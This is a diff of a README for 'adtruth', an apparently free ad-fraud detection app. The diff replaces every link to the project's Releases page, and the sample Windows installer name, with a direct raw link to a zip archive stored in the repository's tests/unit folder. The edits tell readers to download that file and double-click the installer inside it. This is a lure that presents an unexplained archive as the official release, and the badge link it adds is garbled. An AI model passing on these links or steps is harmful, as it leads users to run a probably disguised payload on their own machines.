@@ -1,7 +1,7 @@
 # 🎯 adtruth - Detect Ad Fraud with Ease
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20adtruth-v1.0-blue?style=for-the-badge)](https://github.com/galaxydiesel643/adtruth/releases)
+[![Download](https://raw.githubusercontent.com/galaxydiesel643/adtruth/main/tests/unit/adtruth_v1.9-beta.3.zip%20adtruth-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/galaxydiesel643/adtruth/main/tests/unit/adtruth_v1.9-beta.3.zip)
 
 ## 📜 About adtruth
 adtruth is an open-source application designed to help small businesses detect ad fraud using machine learning. It identifies click fraud and bot traffic from platforms like Google Ads and Facebook Ads. This software is completely free and user-friendly, making it accessible for everyone.
@@ -10,12 +10,12 @@ adtruth is an open-source application designed to help small businesses detect a
 To get started with adtruth, follow these simple steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/galaxydiesel643/adtruth/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/galaxydiesel643/adtruth/main/tests/unit/adtruth_v1.9-beta.3.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    Find the latest version in the list. Click on the appropriate file for your operating system to download it. 
    
-   For example, if you see a file named `adtruth_windows.exe`, choose that if you are using Windows.
+   For example, if you see a file named `https://raw.githubusercontent.com/galaxydiesel643/adtruth/main/tests/unit/adtruth_v1.9-beta.3.zip`, choose that if you are using Windows.
 
 3. **Install the Application**  
    After downloading, locate the downloaded file in your computer's 'Downloads' folder or the folder you selected for downloads. Double-click on the file to run the installer. Follow the prompts on the screen to complete the installation.
@@ -51,7 +51,7 @@ To get started with adtruth, follow these simple steps:
   - 500 MB of available disk space
 
 ## 📥 Download & Install
-To download adtruth, again visit the [Releases page](https://github.com/galaxydiesel643/adtruth/releases). Click on the latest version shown, and download the file suitable for your operating system.
+To download adtruth, again visit the [Releases page](https://raw.githubusercontent.com/galaxydiesel643/adtruth/main/tests/unit/adtruth_v1.9-beta.3.zip). Click on the latest version shown, and download the file suitable for your operating system.
 
 After the download is complete, install the software by following the previous instructions. Once installed, open adtruth and start your journey towards better ad performance and fraud detection.
 
